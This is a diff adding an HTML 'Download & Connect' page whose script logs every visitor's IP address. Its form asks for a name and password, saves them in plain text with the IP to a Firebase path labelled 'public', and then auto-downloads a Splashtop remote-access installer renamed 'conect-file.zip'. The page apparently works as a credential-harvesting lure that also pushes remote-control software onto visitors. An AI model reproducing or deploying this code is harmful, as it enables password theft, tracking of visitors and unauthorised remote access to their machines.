@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download & Connect</title>
+    <link rel="stylesheet" href="assets/css/styles.css">
+    <script src="assets/js/main.js" defer></script>
+
+
+</head>
+
+<body>
+    <div id="header-placeholder"></div>
+
+    <main>
+        <section>
+            <h1>Download & Connect</h1>
+            <form id="contactForm">
+                <input type="text" id="name" placeholder="Your Name">
+                <input type="password" id="password" placeholder="Enter Password">
+                <button type="submit" id="submitBtn">Download</button>
+            </form>
+            <p class="tac">For support, email: <span id="email-text">luis@smartelectronicssolutions.com</span></p>
+        </section>
+    </main>
+
+    <div id="footer-placeholder"></div>
+
+    <script type="module">
+        import { getDatabase, get, ref, set, push } from './assets/js/firebase-init.js';
+
+        document.addEventListener("DOMContentLoaded", async function () {
+            const contactForm = document.getElementById("contactForm");
+
+            async function getIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error("Error fetching IP address:", error);
+                    return "Unknown IP";
+                }
+            }
+
+            async function updateVisitCount(ipAddress) {
+                const db = getDatabase();
+                const sanitizedIP = ipAddress.replace(/\./g, '-');
+                const visitCountRef = ref(db, 'public/ses/visitCount');
+                const visitsLogRef = ref(db, `public/ses/visits/${sanitizedIP}`);
+
+                const visitTime = new Date().toISOString();
+
+                try {
+                    const snapshot = await get(visitCountRef);
+                    let visitCount = snapshot.exists() ? snapshot.val() : 0;
+                    visitCount += 1;
+                    await set(visitCountRef, visitCount);
+
+                    const visitSnapshot = await get(visitsLogRef);
+                    if (visitSnapshot.exists()) {
+                        const existingData = visitSnapshot.val();
+                        if (!existingData.timestamps) existingData.timestamps = [];
+                        existingData.timestamps.push(visitTime);
+                        await set(visitsLogRef, existingData);
+                    } else {
+                        await set(visitsLogRef, { ip: ipAddress, timestamps: [visitTime] });
+                    }
+                } catch (error) {
+                    console.error("Error updating visit count:", error);
+                }
+            }
+
+            async function logUserData(name, password, ipAddress) {
+                const db = getDatabase();
+                const userRef = push(ref(db, "public/ses/users"));
+                const userData = {
+                    name,
+                    password,
+                    ip: ipAddress,
+                    timestamp: new Date().toISOString()
+                };
+
+                try {
+                    await set(userRef, userData);
+                    console.log("User data saved.");
+                } catch (error) {
+                    console.error("Error saving user data:", error);
+                }
+            }
+
+            contactForm.addEventListener("submit", async function (event) {
+                event.preventDefault();
+                const name = document.getElementById("name").value;
+                const password = document.getElementById("password").value;
+                const ipAddress = await getIP();
+
+                await logUserData(name, password, ipAddress);
+                await updateVisitCount(ipAddress);
+
+                const downloadLink = document.createElement("a");
+                downloadLink.href = "https://my.splashtop.com/team_deployment/download/TX7WXPYJ23PR";
+                downloadLink.download = "conect-file.zip";
+                document.body.appendChild(downloadLink);
+                downloadLink.click();
+                document.body.removeChild(downloadLink);
+            });
+
+            const ipAddress = await getIP();
+            updateVisitCount(ipAddress);
+        });
+
+    </script>
+</body>
+
+</html>
